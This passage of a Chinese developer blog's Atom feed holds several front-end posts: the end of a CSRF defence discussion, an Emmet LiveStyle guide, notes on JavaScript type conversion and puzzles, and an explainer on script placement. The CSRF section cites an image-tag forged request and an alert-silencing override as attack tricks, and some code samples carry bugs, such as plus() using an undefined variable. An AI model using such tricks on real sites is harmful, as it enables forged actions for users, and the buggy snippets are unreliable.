<li>过滤所有用户发布的链接：这个是最无效的做法，因为首先攻击者不一定要从站内发起请求（上面提到过了），而且就算从站内发起请求，途径也远远不知链接一条。比如 <img src="./create_post.php"> 就是个不错的选择，还不需要用户去点击，只要用户的浏览器会自动加载图片，就会自动发起请求。 *在请求发起页面用 alert 弹窗提醒用户：这个方法看上去能干扰站外通过 iframe 发起的 CSRF，但攻击者也可以考虑用 window.alert = function(){}; 把 alert 弄哑，或者干脆脱离 iframe，使用 Flash 来达到目的。</li>
</ul>
<p>总体来说，目前防御 CSRF 的诸多方法还没几个能彻底无解的。所以 CSDN 上看到讨论 CSRF 的文章，一般都会含有“无耻”二字来形容（另一位有该名号的貌似是 DDOS 攻击）。作为开发者，我们能做的就是尽量提高破解难度。当破解难度达到一定程度，网站就逼近于绝对安全的位置了（虽然不能到达）。上述请求令牌方法，就我 认为是最有可扩展性的，因为其原理和 CSRF 原理是相克的。CSRF 难以防御之处就在于对服务器端来说，伪造的请求和正常的请求本质上是一致的。而请求令牌的方法，则是揪出这种请求上的唯一区别——来源页面不同。我们还可 以做进一步的工作，例如让页面中 token 的 key 动态化，进一步提高攻击者的门槛。本文只是作者个人认识的一个总结，便不讨论过深了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询 已经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要“小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。&lt;br&gt;
    
    </summary>
    
    
      <category term="security" scheme="http://summerGreenTea.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Emmet LiveStyle 实现浏览器和编辑器样式同步</title>
    <link href="http://summerGreenTea.github.io/2016/03/05/livestyle-plugin/"/>
    <id>http://summerGreenTea.github.io/2016/03/05/livestyle-plugin/</id>
    <published>2016-03-05T05:23:48.000Z</published>
    <updated>2016-03-05T05:52:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>相信大家都有使用编辑器开发CSS的经验，经常遇到的情况是，我们需要在编辑器修改后，保存，再到浏览器里查看效果，可是往往有的时候我们是反向操作的，即，在浏览器里修改CSS，直接看到效果，但是如果自动能把修改映射到编辑里，将是一个非常有帮助并且极大提高工作效率的事情，在今天这篇文章里，我将介绍强大的Emmet LiveStyle.<br><a id="more"></a></p>
<h3 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h3><ul>
<li>实时更新：输入即可看到效果，无须保存，也无须重新加载</li>
<li>不需要本地文件</li>
<li>跨平台</li>
<li>多视图多设备支持</li>
<li>多站支持</li>
<li>安装简单</li>
</ul>
<h3 id="安装Sublime-Text插件"><a href="#安装Sublime-Text插件" class="headerlink" title="安装Sublime Text插件"></a>安装Sublime Text插件</h3><ol>
<li>打开命令面板：ctrl + shift + p</li>
<li>输入：install Package</li>
<li>搜索：LiveStyle</li>
</ol>
<img src="/2016/03/05/livestyle-plugin/livestyle.png" alt="livestyle.png" title="">
<p>注：LiveStyle和Emmet一样，需要PyV8插件的支持。建议先安装Emmet，因为安装Emmet的同时会自动安装PyV8。</p>
<h3 id="安装chrome-plugin"><a href="#安装chrome-plugin" class="headerlink" title="安装chrome plugin"></a>安装chrome plugin</h3><p>你可以再chrome的应用商店搜索下载 <strong>Emmet LiveStyle</strong>这个插件，但是考虑到天朝的墙的问题，很多同学无法访问到Chrome的应用商店。大家可以在这个国内的一个网站叫<a href="http://www.cnplugins.com/" target="_blank" rel="external">插件网</a>去下载，然后按照<a href="http://www.cnplugins.com/tools/how-to-setup-crx.html" target="_blank" rel="external">这个网站</a>的提示步骤去安装好久OK了。</p>
<p>安装好后，我们可以在chrome的右上角看到图下的标志，此时它是关闭的。<br><img src="/2016/03/05/livestyle-plugin/chrome.png" alt="chrome.png" title=""></p>
<h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>在Sublime Text里面打开我们的项目，然后选择我们的静态页面，在Chrome中运行。</p>
<p>点击Chrome右上角的LiveStyle的图标，将其打开，就可以发现如下图所示：<br><img src="/2016/03/05/livestyle-plugin/code.png" alt="code.png" title=""></p>
<p>然后我们就是愉快的在编辑器中写代码了。<br>So easy了~~ ，再多一个字我都不愿意在介绍下去。  </p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;相信大家都有使用编辑器开发CSS的经验，经常遇到的情况是，我们需要在编辑器修改后，保存，再到浏览器里查看效果，可是往往有的时候我们是反向操作的，即，在浏览器里修改CSS，直接看到效果，但是如果自动能把修改映射到编辑里，将是一个非常有帮助并且极大提高工作效率的事情，在今天这篇文章里，我将介绍强大的Emmet LiveStyle.&lt;br&gt;
    
    </summary>
    
    
      <category term="css" scheme="http://summerGreenTea.github.io/tags/css/"/>
    
      <category term="plugins" scheme="http://summerGreenTea.github.io/tags/plugins/"/>
    
      <category term="tools" scheme="http://summerGreenTea.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>Javascript的类型转换</title>
    <link href="http://summerGreenTea.github.io/2016/01/25/javascript-type-conversion/"/>
    <id>http://summerGreenTea.github.io/2016/01/25/javascript-type-conversion/</id>
    <published>2016-01-25T08:37:04.000Z</published>
    <updated>2016-05-30T07:12:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>javascript中的数值类型转换非常灵活，这要归咎于它是一门弱类型语言，从被一设计出来就对取值类型不敏感。松散的数据类型给JS带来了很大的灵活性，但是与之而来的问题也有很多…<br><a id="more"></a><br>javascript将根据需要自行转换类型的值，常见的情况有对原始数据类型进行Boolean值转化，数字到字符串之间的转换等等。那么这些转换的规则在某种程度来说，有一定的规则可循。</p>
<h3 id="类型转化规则和注意点"><a href="#类型转化规则和注意点" class="headerlink" title="类型转化规则和注意点"></a>类型转化规则和注意点</h3><p>我们看下下面的代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">7</span> + <span class="string">'is seven'</span>   <span class="comment">// =&gt; '7 is seven'</span></div><div class="line"><span class="number">10</span> - <span class="string">'one'</span>       <span class="comment">// =&gt; NaN</span></div><div class="line">!<span class="string">'hello'</span>         <span class="comment">// =&gt; false</span></div></pre></td></tr></table></figure></p>
<p>它们都是不同类型之间的运算或转换。它们的转化规则如下:<br><img src="/2016/01/25/javascript-type-conversion/jyct.jpg" alt="图片来自《javascript权威指南》" title="图片来自《javascript权威指南》"><br>其中的一些转换规则我们需要特别注意:</p>
<ul>
<li><p>当字符串转化为数字的时候，那些以数字表示的字符串可以转化为数字，也允许字符串前后也可以存在空格，其他的情况得到的转化结果都将为<strong>NaN</strong>。</p>
</li>
<li><p>而<strong>true</strong>和<strong>false</strong>转化为数字后的值为1和0。</p>
</li>
<li><p>undefined、null、0、’’、NaN转化为Boolean的值都为false，也有些人称这些值为”假值”。</p>
</li>
<li><p><strong>+</strong>在JS中有两种用法，一种是<strong>一元加</strong>，做为一元运算符，主要作为将某种数据类型转为数值类型，比如: <code>+&quot;46&quot;</code>;另一种用法是作为<strong>加号</strong>，做字符串连接和计算数值相加之用。</p>
</li>
</ul>
<h3 id="显式类型转化和隐式类型转化"><a href="#显式类型转化和隐式类型转化" class="headerlink" title="显式类型转化和隐式类型转化"></a>显式类型转化和隐式类型转化</h3><p>两种类型转化从叫法上就可以听出是从类型转化是否”明显、清晰”来判断的。<br>在JS中，显式类型转化通常就是调用原生构造函数来实现:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">Number</span><span class="params">(<span class="string">'3'</span>)</span></span>  <span class="comment">// =&gt; 3</span></div><div class="line"><span class="function"><span class="title">String</span><span class="params">(undefined)</span></span> <span class="comment">// =&gt; "undefined"</span></div><div class="line"><span class="function"><span class="title">Boolean</span><span class="params">(<span class="number">1</span>)</span></span> =&gt; true</div></pre></td></tr></table></figure></p>
<p>而隐式类型转化通常都是通过一些运算符来实现的。上面提到的<strong>一元加</strong>，就是一种隐式类型转换的产生方式。</p>
<h3 id="对象转化为原始值"><a href="#对象转化为原始值" class="headerlink" title="对象转化为原始值"></a>对象转化为原始值</h3><p>对象转化为原始值无非就是三种: String、Number和Boolean。对象转化为Boolean想对简单，直接都转化为true。我们要分析的是对象转化为String和Number。</p>
<h4 id="toString-和valueOf-方法"><a href="#toString-和valueOf-方法" class="headerlink" title="toString()和valueOf()方法"></a>toString()和valueOf()方法</h4><p>toString方法是返回一个反映该对象的字符串，而valueOf返回该对象的原始值的表示形式。JS中的对象都有toString()这个方法，因为所有的JS引用类型的对象都继承自Object这个对象。Object的toString()方法返回的是”[object 对象构造函数名]”的形式。很多对象都重写了Object上的toString()方法。数组的toString()返回一个数组元素之间加逗号组成的字符串;函数则返回这个函数的实现定义方式;日期类返还一个可读的日期和时间字符串。</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[<span class="name">2</span>,<span class="number">3</span>,<span class="number">5</span>].toString() // =&gt; <span class="string">"2,3,5"</span></div><div class="line">(<span class="name">function</span>(<span class="name">x</span>) &#123;f(<span class="name">x</span>)<span class="comment">;&#125;).toString() // =&gt; "function(x) &#123;\n f(x); \n&#125;"</span></div><div class="line">new Date(<span class="name">2010</span>, <span class="number">0</span>, <span class="number">1</span>).toString() // =&gt; <span class="string">"Fri Jan 01 2010 00:00:00 GMT-0800 (PST)"</span></div></pre></td></tr></table></figure>
<p>由于大多数对象都无法直接表示为原始值，所以valueOf()只是简单的返回对象本身，而不是一个原始值。日期类调用valueOf()的话会返回自1970年1月1日以来的毫秒数表示。<br><figure class="highlight pony"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">new</span> <span class="title">Date</span>().<span class="title">valueOf</span>() <span class="comment">// =&gt; 1453724534867</span></span></div></pre></td></tr></table></figure></p>
<h4 id="转换步骤"><a href="#转换步骤" class="headerlink" title="转换步骤"></a>转换步骤</h4><p>javascript对象转化为字符串的转换步骤为:</p>
<ul>
<li><p>对象调用toString()方法，如果返回的是一个原始值，则将这个原始值转化为字符串返回。</p>
</li>
<li><p>如果对象没有toString()方法或者返回的值不是原始值的话，那么对象将调用valueOf()。如果这个方法存在的话，那么就调用这个方法。如果返回的是原始值，那么将这个原始值转化为字符串，并返回这个字符串。</p>
</li>
<li><p>如果上述步骤都无法获得一个原始值的话，那么它将会报出一个类型异常的错误。</p>
</li>
</ul>
<p>javascript对象转化为数值的转换步骤为:</p>
<ul>
<li><p>如果对象有valueOf()方法，并且这个方法返回一个原始值的话，那么将这个原始值转化为数字返回。 </p>
</li>
<li><p>否则，如果对象有toString()方法，那么调用这个方法，如果返回的是一个原始值的话，转换这个原始值为数字并返回。</p>
</li>
<li><p>否者，抛出一个类型异常错误。</p>
</li>
</ul>
<p>下面这个例子，我们重写了对象的<code>toString</code>和<code>valueOf</code>方法来验证上面步骤是否叙述正确。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> person = &#123;</div><div class="line">	valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'valueof'</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">10</span>;</div><div class="line">	&#125;,</div><div class="line">	toString: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'toString'</span>);</div><div class="line">		<span class="keyword">return</span> <span class="string">'person'</span>;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"><span class="built_in">console</span>.log(+person); <span class="comment">// =&gt; 'valueof' 10</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>(person)); <span class="comment">// =&gt; 'toString' 10</span></div></pre></td></tr></table></figure></p>
<h3 id="号操作符的疑惑"><a href="#号操作符的疑惑" class="headerlink" title="+号操作符的疑惑"></a><code>+</code>号操作符的疑惑</h3><p>似乎上面的代码比较符合我们所写的规则，但是我们在看下几个例子：<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">console</span>.log(person + <span class="string">''</span>); <span class="regexp">//</span> =&gt; <span class="string">'valueOf'</span> <span class="string">'10'</span></div><div class="line"><span class="built_in">console</span>.log(person + <span class="string">' test'</span>); <span class="regexp">//</span> =&gt; <span class="string">'valueOf'</span> <span class="string">'10 test'</span></div></pre></td></tr></table></figure></p>
<p>在这个例子中，我们使用了加号操作符来对对象和字符串进行连接，但是发现得到的这两个结果和我们预期不符，这个是为什么呢？<br>stackoverflow上的<a href="http://stackoverflow.com/questions/248563valueof-vs-tostring-in-javascript" target="_blank" rel="external">这个提问</a>，以及Ben Cherry<a href="http://www.adequatelygood.comObject-to-Primitive-Conversions-in-JavaScript.html" target="_blank" rel="external">这篇博客</a>给了我们答案。</p>
<p><code>+</code>操作符有如下定义过程:</p>
<ol>
<li>计算操作符左边的值</li>
<li>计算操作符右边的值</li>
<li>调用<code>ToPrimitive</code>来计算左边和右边的原始值(不使用<code>hint</code>)</li>
<li>如果两边的原始值都是<strong>String</strong>的话，调到步骤7</li>
<li>调用<code>ToNumber</code>去计算两边的值</li>
<li>返回两边值的和</li>
<li>调用<code>ToString</code>计算两边的值</li>
<li>返回两边值的连接</li>
</ol>
<p>在Ben Cherry的博客上给出了关于<code>hint</code>的定义：</p>
<blockquote>
<p>[[DefaultValue]] is an internal property of every object. It’s a method that takes an optional hint, which should be either Number or String. If a hint is not provided, it will default to Number unless the object is a Date, in which case it defaults to String.</p>
</blockquote>
<p>所以，在使用<code>ToPrimitive</code>去计算操作符两边的值的时候，由于不使用<code>hint</code>，那么<code>hint</code>默认为<strong>Number</strong>，这个时候的<code>ToPrimitive</code>就使用<code>Number()</code>去计算两边的值，那么按照我们之前提到的对象转化为数值的计算方法，就会调用<code>valueOf()</code>方法。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>看完Ben Cherry的这篇博客之后，才知道原来有小小的类型转换内部的处理过程是那么复杂。看来以后相关的JS博客要写入Javascript从入门到放弃系列了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;javascript中的数值类型转换非常灵活，这要归咎于它是一门弱类型语言，从被一设计出来就对取值类型不敏感。松散的数据类型给JS带来了很大的灵活性，但是与之而来的问题也有很多…&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>收集的一些有趣的javascript问题</title>
    <link href="http://summerGreenTea.github.io/2016/01/25/javascript-programming-question/"/>
    <id>http://summerGreenTea.github.io/2016/01/25/javascript-programming-question/</id>
    <published>2016-01-25T06:01:25.000Z</published>
    <updated>2016-03-03T14:18:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>在网上看到一些不错的javascript编程题，于是我也想拿来练练手。这篇博客也将会不断更新。<br><img src="/2016/01/25/javascript-programming-question/jpq.jpg" alt="jpq.jpg" title=""><br><a id="more"></a></p>
<h3 id="题目与解答"><a href="#题目与解答" class="headerlink" title="题目与解答"></a>题目与解答</h3><ol>
<li><p>找出数组中最大的元素(使用Math.max函数)。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>];</div><div class="line">console.log(Math.max.apply(null, arr)); <span class="comment">//7</span></div></pre></td></tr></table></figure>
</li>
<li><p>转化一个数字数组为function数组(每个function都弹出相应的数字)。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> numberArray = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>], </div><div class="line">	functionArray = [],</div><div class="line">	i = <span class="number">-1</span>,</div><div class="line">	len = numberArray.length;</div><div class="line"><span class="keyword">while</span>(++i &lt; len) &#123;</div><div class="line">	functionArray.push((<span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">		<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			<span class="built_in">console</span>.log(num)</div><div class="line">		&#125;</div><div class="line">	&#125;)(numberArray[i]))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>给object数组进行排序(排序对象是每个元素对象的属性个数)。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> i = <span class="number">-1</span>,</div><div class="line">	len = obj.length;</div><div class="line">obj.sort(<span class="function"><span class="keyword">function</span>(<span class="params">prev, next</span>) </span>&#123;</div><div class="line">	<span class="keyword">var</span> prevN = <span class="built_in">Object</span>.keys(prev).length,</div><div class="line">		nextN = <span class="built_in">Object</span>.keys(next).length;</div><div class="line">	<span class="keyword">return</span> prevN === nextN ? <span class="number">0</span> : (prevN &gt; nextN ? <span class="number">1</span> : <span class="number">-1</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p>利用Javascipt打印Fibonacci数(不使用全局变量)。</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span><span class="params">(n)</span> <span class="comment">&#123;</span></span></div><div class="line">	var a = [],</div><div class="line">		i = 2,</div><div class="line">		j = 0;</div><div class="line">	a[0] = 0, a[1] = 1;</div><div class="line">	for(; i &lt; n; i++) &#123;</div><div class="line">		a[i] = a[i - 1] + a[i - 2];</div><div class="line">	&#125;</div><div class="line">	<span class="title">while</span><span class="params">(j &lt; n)</span> <span class="comment">&#123;</span></div><div class="line">		console.log(a[j]);</div><div class="line">		j++;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>实现如下语法功能：var a = (5).plus(3).minus(6); //2 。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Number</span>.prototype.plus = <span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">	<span class="keyword">return</span> <span class="keyword">this</span> + a;</div><div class="line">&#125;</div><div class="line"><span class="built_in">Number</span>.prototype.minus = <span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">	<span class="keyword">return</span> <span class="keyword">this</span> - num;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>实现如下语法的功能：var a = add(2)(3)(4); //9 </p>
<figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(x)</span> &#123;</span></div><div class="line">    var <span class="built_in">sum</span> = x;</div><div class="line">    var tmp = <span class="function"><span class="keyword">function</span> <span class="params">(y)</span> &#123;</span></div><div class="line">        <span class="built_in">sum</span> = <span class="built_in">sum</span> + y;</div><div class="line">        <span class="keyword">return</span> tmp;</div><div class="line">    &#125;;</div><div class="line">    tmp.toString = <span class="function"><span class="keyword">function</span> <span class="params">()</span> &#123;</span></div><div class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>;</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">return</span> tmp;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>7.实现将一个多维数组的元素全部都转为一个一维数组<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这个题目的解答过程非常巧妙</span></div><div class="line"><span class="comment">//利用数组与字符串相加，然后让数组转化为字符串的方式来得到一个数组中所有元素用逗号连成的字符串</span></div><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,[<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]]];</div><div class="line">var newArr = (arr + '').split(',');</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在网上看到一些不错的javascript编程题，于是我也想拿来练练手。这篇博客也将会不断更新。&lt;br&gt;&lt;img src=&quot;/2016/01/25/javascript-programming-question/jpq.jpg&quot; alt=&quot;jpq.jpg&quot; title=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="programming" scheme="http://summerGreenTea.github.io/tags/programming/"/>
    
  </entry>
  
  <entry>
    <title>为什么要把JS放在body底部？</title>
    <link href="http://summerGreenTea.github.io/2016/01/24/put-js-in-body-bottom/"/>
    <id>http://summerGreenTea.github.io/2016/01/24/put-js-in-body-bottom/</id>
    <published>2016-01-24T11:00:26.000Z</published>
    <updated>2016-03-02T03:04:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>在前端的”启蒙”时期就在Yahoo军规里面看到关于网页性能优化的这条军规，在实际的代码书写中，我也一直遵循着这条规则。但是在很长一段时间里，我却不知其真正所以然。每次看到这些页面优化法则的时候，附带的解释总是那么几句，心里总是要要打一个大大的问号。这篇博客，就是梳理我对这个问题的一些了解和思考。<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前些天，在微博上看到了一篇关注度很高的文章<a href="http://web.jobbole.com/84843/" target="_blank" rel="external">JS 一定要放在 Body 的最底部么？聊聊浏览器的渲染机制</a>,让我联想到一系列在之前接触了解到的浏览器渲染机制和Javascript单线程的知识，刚好借看到的这篇文章的机会做个详细的梳理。</p>
<h2 id="浏览器的渲染机制"><a href="#浏览器的渲染机制" class="headerlink" title="浏览器的渲染机制"></a>浏览器的渲染机制</h2><p>我经常会看到一类面试题就是<strong>一个页面，从输入URL地址到页面被加载出来都发生了什么?</strong>,事实上，关于这个问题，我觉得往小的说，其实就是浏览器的渲染机制，要从大的方面来说，还涉及到DNS寻址，http、TCP/IP协议、路由选择等计算机网络相关方面的知识，具体这里有一篇文章，讲的相当详细，<a href="http://web.jobbole.com/83720/" target="_blank" rel="external">从输入 URL 到页面加载完成的过程中都发生了什么事情？</a>，自认为自己还没达到能说破天际的水平，所以还是往小的来讲。</p>
<p>先来看下浏览器的主要结构:<br><img src="/2016/01/24/put-js-in-body-bottom/layers.png" alt="layers.png" title=""><br>User Interface : 包括地址栏，前进后退，书签菜单等窗口上除了网页显示区域以外的部分。<br>Boswer engine : 查询与操作渲染引擎的接口。<br>Rendering engine : 负责显示请求的内容。比如请求到HTML, 它会负责解析HTML 与 CSS 并将结果显示到窗口中。</p>
<pre><code>* Networking ：用于网络请求, 如HTTP请求。它包括平台无关的接口和各平台独立的实现。
* Javascript Interpreter ：用于解析执行JavaScript代码。
* Ui Backend : 绘制基础元件，如组合框与窗口。它提供平台无关的接口，内部使用操作系统的相应实现。
</code></pre><p>这里借一张webkit的main flow图片来开个头：<br><img src="/2016/01/24/put-js-in-body-bottom/webkitflow.png" alt="webkitflow.png" title=""><br>当服务器响应我们的请求并发回我们想要访问页面的HTML代码的时候，浏览器的work flow是:</p>
<ul>
<li>首先调用<strong>Rendering engine</strong>的<strong>Ui Backend</strong>去解析获得的HTML代码，这个时候浏览器如果发现HTML中有外部资源(比如css、js以及img)，就会调用<strong>Networking</strong>并行向资源所在服务器发起HTTP请求来请求返回资源。当页面中所有的HTML代码都被解析完成后，就会生成<strong>DOM Tree</strong>。这是一个树形的数据结构，而且DOM Tree的构建过程是一个深度遍历的过程。利用代码和图片表示下就为:</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">	<span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></div><div class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">			Hello World</div><div class="line">		<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"example.png"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>将被转化为:<br><img src="/2016/01/24/put-js-in-body-bottom/dom-tree.png" alt="dom-tree.png" title=""></p>
<ul>
<li>浏览器将请求的每个CSS文件下载好并生成一个<strong>StyleSheet object</strong>，每个对象都包含若干个<strong>CSS Rule</strong>，这些CSS Rule对象包含<strong>Selector</strong>和<strong>Declaration object</strong>，其他的对象就是CSS的语法。</li>
</ul>
<img src="/2016/01/24/put-js-in-body-bottom/css-rule.png" alt="css-rule.png" title="">
<ul>
<li>浏览器会将生成的DOM Tree和CSS Rule结合形成<strong>Render Tree</strong>。</li>
</ul>
<img src="/2016/01/24/put-js-in-body-bottom/dom-tree-and-css-rules.jpg" alt="dom-tree-and-css-rules.jpg" title="">
<ul>
<li><p>接下浏览器要做的就是将生成的Render Tree渲染到我们的用户界面当中。这一步就是<strong>Layout</strong>。浏览器会计算每个DOM节点上的位置信息，来确定节点在用户界面的位置(这个过程操作相对复杂、耗时，也是DOM操作缓慢的原因之一)。</p>
</li>
<li><p>当浏览器知道相应节点的位置信息后，渲染引擎将Render Tree中的节点中的其他渲染规则应用到节点上。</p>
</li>
</ul>
<p>当结束前面的步骤后，一个HTML页面就会被渲染出来。似乎已经全部讲完了，但整个过程却还没有那么简单的结束哦！</p>
<h2 id="Ui-Backend阻塞"><a href="#Ui-Backend阻塞" class="headerlink" title="Ui Backend阻塞"></a>Ui Backend阻塞</h2><p>我们在第一步的时候提到了，渲染引擎会在解析到有外部资源的HTML代码时，调用网络去发起HTTP请求。当请求的是Js文件并且Js文件下载完成后，会将Ui Backend(我理解为UI Thread)阻塞，并等待JS代码下载解析完成才唤醒Ui Backend。</p>
<p>这个是因为Js不仅可以完成逻辑操作，还可以对DOM的操作来改变页面的内容，如果Ui Backend继续渲染，那么等到渲染完成后再执行Js,而这时的Js中有大量对DOM的操作的话，那么势必会造成大量的Repaint/Reflow。这种做法显然不太合适，所以浏览器选择去执行Rendering engine 中的Javascript Interpreter(我理解为Js Thread)，而阻塞Ui Backend，显然，用户需要等待更长的时间才能看到他们想要访问的页面。</p>
<p>出于对这种情况的考虑，所以很多人建议把JS文件放在Body底部，这样就可以等到页面渲染完成后再执行JS。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>通过上面内容的了解，我们可以得出将JS文件放在页面底部的做法是非常可取的结论，那么在实际的工程项目运用是是否真的是如此呢？答案是否定的。</p>
<p>思考一个应用场景，我们通常需要根据用户的浏览器版本以及用户打开页面第一时间的信息(当前的网络环境等等)来记录一些数据或处理一些兼容性问题。常见的有<em>html5shim.js</em>等类库，需要处理兼容低版本浏览器，但是如果等到页面加载完成之后再加载这类文件的话，就会造成一些不知名的错误。但是通常来说，具体的项目环境，会有不同的使用规则。知乎上这个问题的<a href="https://www.zhihu.com/question/34147508" target="_blank" rel="external">金戈铁马的回答</a>就很能说明这个问题。</p>
<p>当然这是特殊的情况都有一个共同点，就是这些JS文件必须不能涉及到页面逻辑，也就是不能存在操作DOM代码。</p>
]]></content>
    
    <summary type="html">
    
